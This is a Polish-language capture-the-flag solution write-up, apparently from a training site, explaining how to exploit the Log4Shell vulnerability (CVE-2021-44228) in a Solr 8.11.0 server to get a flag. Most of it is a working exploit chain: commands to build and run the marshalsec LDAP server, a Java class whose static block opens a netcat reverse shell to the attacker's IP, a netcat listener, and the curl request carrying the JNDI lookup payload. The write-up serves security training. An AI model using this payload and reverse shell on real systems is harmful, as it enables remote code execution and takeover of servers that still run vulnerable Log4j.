## Opis

To zadanie było przykładem wykorzystania prawdziwej podatności z roku 2021, znanej jako `CVE-2021-44228`, a potocznie nazywanej „Log4Shell”.
Log4Shell to krytyczna luka w bibliotece Log4j, która pozwala atakującemu na zdalne wykonanie kodu poprzez odpowiednio spreparowane dane logowania.
Umożliwia to atakującemu uzyskanie kontroli nad podatnym serwerem np. przez utworzenie połączenia zwrotnego (reverse shell).

## Rozwiązanie

Po wygenerowaniu swojej instancji zadania, należało zidentyfikować usługi sieciowe działające na serwerze.
W tym celu można było użyć narzędzi takich jak `nmap`.

Na serwerze działała usługa HTTP na porcie 8983, która była Solrem 8.11.0 — popularną
platformą do wyszukiwania i indeksowania danych, która korzystała z podatnej wersji Log4j.
Podatność ta mogła zostać wykryta przy użyciu narzędzi takich jak [Metasploit Framework](https://www.metasploit.com/), a także poprzez podstawowy research w internecie.

Aby uzyskać dostęp do serwera, można było wykorzystać podatność Log4Shell, wysyłając odpowiednio spreparowane żądanie HTTP do usługi Solr.

Istniały również inne sposoby zdobycia flagi, które nie wymagały samodzielnego uruchamiania exploita Log4Shell. Poniżej opisano przykładowe rozwiązanie wykorzystujące tę podatność.

### Koncepcja ataku

1. Serwer LDAP (np. [marshalsec](https://github.com/mbechler/marshalsec)) uruchomiony lokalnie na porcie 1389, zwracający referencję do klasy Java na naszym serwerze HTTP.
2. Serwer HTTP (np. `python3 -m http.server`) uruchomiony lokalnie na porcie 8000, zwracający zainfekowaną klasę Java.
3. Wysyłamy żądanie HTTP do Solr na adres `/solr/admin/cores`, a jako parametr dodajemy `?cokolwiek=${jndi:ldap://<IP_ATAKUJĄCEGO>:1389/<NAZWA_NASZEGO_EXPLOITU>}`.

Solr wysyła żądanie do naszego serwera LDAP, który zwraca referencję do klasy Java. Następnie pobiera ją z naszego serwera HTTP i wykonuje na serwerze ofiary.

Przykład zainfekowanej klasy Java:

```java
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash <IP_ATAKUJĄCEGO> 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### Dokładny przebieg ataku

1. Uruchamiamy serwer LDAP:

Pobieramy serwer z GH:

```
git clone https://github.com/mbechler/marshalsec
```

Wchodzimy do katalogu serwera:

```
cd marshalsec
```

Budujemy projekt:

```
mvn clean package -DskipTests
```

Uruchamiamy serwer LDAP:

```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<IP_ATAKUJĄCEGO>:8000/#Exploit" 1389
```

2. Uruchamiamy serwer HTTP (zwracający zainfekowaną klasę Java):

Najpierw tworzymy klasę Exploit.java:

```java
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash <IP_ATAKUJĄCEGO> 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Kompilujemy klasę (dla Javy 8, ponieważ Solr 8.11.0 jest kompatybilny z tą wersją):

```bash
javac -source 8 -target 8 Exploit.java
```

To utworzy plik `Exploit.class`, który będzie zwracany przez nasz serwer HTTP.

Uruchamiamy serwer HTTP:

```
python3 -m http.server 8000
```

3. Uruchamiamy `nc` na porcie 9999, aby odebrać połączenie zwrotne:

```
nc -lnvp 9999
```

4. Wysyłamy żądanie HTTP do Solr, wykorzystując podatność Log4Shell:

```
curl 'http://<IP_SERWERA>:8983/solr/admin/cores?cokolwiek=$\{jndi:ldap://<IP_ATAKUJĄCEGO>:1389/Exploit\}'
```

5. Powinniśmy otrzymać połączenie zwrotne (reverse shell) w `nc`, co oznacza, że udało nam się zdalnie wykonać kod na serwerze ofiary. Na tym etapie mamy bezpośredni dostęp do serwera i możemy odczytać ukrytą na nim flagę.


**Uwaga: Pamiętaj, że klasa Exploit może mieć dowolną inną nazwę, ważne jest tylko, aby była zgodna z tym, co zwracają nasze serwery LDAP oraz HTTP.**

> Zadanie wymagało również obejścia zabezpieczeń Cloudflare WAF.
>
> Poradnik znajdziesz w rozwiązaniu zadania [Czemu to nie działa???](https://hack4krak.pl/tasks/solution/czemu-nie-dziala) na stronie hack4krak.pl.
